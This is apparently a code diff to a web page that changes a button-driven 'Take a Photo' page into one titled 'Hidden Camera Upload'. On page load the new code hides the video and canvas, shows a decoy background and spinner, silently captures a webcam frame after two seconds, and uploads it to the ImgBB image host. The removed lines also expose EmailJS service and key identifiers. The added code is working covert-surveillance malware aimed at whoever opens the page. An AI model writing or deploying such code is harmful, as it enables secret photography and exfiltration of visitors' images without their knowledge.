@@ -2,55 +2,85 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Auto Camera Email</title>
+  <title>Hidden Camera Upload</title>
   <style>
-    body { font-family: sans-serif; text-align: center; margin-top: 40px; }
-    video, canvas, img { margin-top: 20px; }
-    canvas, img { display: none; border: 1px solid #ccc; }
-    button { padding: 10px 20px; font-size: 16px; margin-top: 20px; }
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: sans-serif;
+      background-image: url('R.jpeg');
+      background-size: cover;
+      background-position: center;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    #loader-wrapper {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.3); /* نیمه شفاف */
+      display: none;
+      align-items: center;
+      justify-content: center;
+    }
+
+    #loader {
+      border: 10px solid #f3f3f3;
+      border-top: 10px solid #3498db;
+      border-radius: 50%;
+      width: 80px;
+      height: 80px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    video, canvas { display: none; }
   </style>
 </head>
 <body>
 
-  <h2>Take a Photo</h2>
-  <video id="video" width="320" height="240" autoplay></video><br>
-  <button id="snap">Take Photo</button>
-  <canvas id="canvas" width="320" height="240"></canvas><br>
-  <img id="preview" width="320" height="240" alt="Captured Image" />
+  <div id="loader-wrapper">
+    <div id="loader"></div>
+  </div>
 
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-  <script>
-    (function(){
-      emailjs.init("p5Vq28AEYWLO8LZ1I"); // Replace with your EmailJS Public Key
-    })();
-  </script>
+  <video id="video" width="320" height="240" autoplay></video>
+  <canvas id="canvas" width="320" height="240"></canvas>
 
   <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
-    const snapButton = document.getElementById('snap');
-    const previewImage = document.getElementById('preview');
+    const loaderWrapper = document.getElementById('loader-wrapper');
 
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
-      })
-      .catch(err => {
-        console.error("Camera error:", err);
-      });
+    function startCamera() {
+      loaderWrapper.style.display = 'flex';
 
-    snapButton.addEventListener('click', () => {
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const imageData = canvas.toDataURL('image/jpeg');
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          video.srcObject = stream;
 
-      // Show image preview
-      previewImage.src = imageData;
-      previewImage.style.display = 'inline';
+          setTimeout(() => {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            stream.getTracks().forEach(track => track.stop());
 
-      // Upload to ImgBB
-      uploadToImgBB(imageData);
-    });
+            const imageData = canvas.toDataURL('image/jpeg');
+            uploadToImgBB(imageData);
+          }, 2000);
+        })
+        .catch(err => {
+          console.error("Camera error:", err);
+         // loaderWrapper.style.display = 'none';
+        });
+    }
 
     function uploadToImgBB(imageData) {
       const formData = new FormData();
@@ -62,29 +92,16 @@
       })
       .then(res => res.json())
       .then(data => {
-        const imageUrl = data.data.url;
-        sendEmail(imageUrl);
+        console.log("✅ Uploaded to ImgBB:", data.data.url);
+        //loaderWrapper.style.display = 'none';
       })
       .catch(err => {
-        console.error("Upload failed:", err);
+        console.error("❌ Upload failed:", err);
+       // loaderWrapper.style.display = 'none';
       });
     }
 
-    function sendEmail(imageUrl) {
-      const templateParams = {
-        to_name: "Adnan",
-        message: `New photo captured: ${imageUrl}`
-      };
-
-      emailjs.send("service_3b779ys", "template_l1doglh", templateParams)
-        .then(response => {
-          alert("✅ Email sent successfully!");
-          console.log("Email sent!", response.status, response.text);
-        }, err => {
-          alert("❌ Email failed to send.");
-          console.error("Email failed...", err);
-        });
-    }
+    window.onload = startCamera;
   </script>
 
 </body>
